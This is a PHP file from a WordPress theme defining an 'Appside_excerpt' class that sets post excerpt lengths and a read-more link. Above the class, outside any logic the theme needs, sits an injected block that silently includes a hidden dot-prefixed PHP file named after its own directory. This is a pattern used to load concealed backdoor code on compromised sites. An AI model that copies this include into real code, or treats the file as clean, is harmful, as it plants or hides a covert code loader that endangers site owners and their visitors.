<?php
if (!defined('ABSPATH')){
	exit(); //exit if access it directly
}
/*
* Theme Excerpt Class
* @since 1.0.0
* @source https://gist.github.com/bgallagh3r/8546465
*/
if (!class_exists('Appside_excerpt')):
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Appside_excerpt {

    // Default length (by WordPress)
    public static $length = 55;

    // So you can call: my_Appside_excerpt('short');
    public static $types = array(
      'short' => 25,
      'regular' => 55,
      'long' => 100,
      'promo'=>15
    );

    public static $more = true;

    /**
    * Sets the length for the excerpt,
    * then it adds the WP filter
    * And automatically calls the_excerpt();
    *
    * @param string $new_length
    * @return void
    * @author Baylor Rae'
    */
    public static function length($new_length = 55, $more = true) {
        Appside_excerpt::$length = $new_length;
        Appside_excerpt::$more = $more;

        add_filter( 'excerpt_more', 'Appside_excerpt::auto_excerpt_more' );

        add_filter('excerpt_length', 'Appside_excerpt::new_length');

        Appside_excerpt::output();
    }

    // Tells WP the new length
    public static function new_length() {
        if( isset(Appside_excerpt::$types[Appside_excerpt::$length]) )
            return Appside_excerpt::$types[Appside_excerpt::$length];
        else
            return Appside_excerpt::$length;
    }

    // Echoes out the excerpt
    public static function output() {
        the_excerpt();
    }

    public static function continue_reading_link() {

        return '<span class="readmore"><a href="'.get_permalink().'">'.esc_html__('Read More','aapside-master').'</a></span>';
    }

    public static function auto_excerpt_more( ) {
        if (Appside_excerpt::$more) :
            return ' ';
        else :
            return ' ';
        endif;
    }

} //end class
endif;

// An alias to the class
if (!function_exists('Appside_excerpt')){

	function Appside_excerpt($length = 55, $more=true) {
		Appside_excerpt::length($length, $more);
	}

}


?>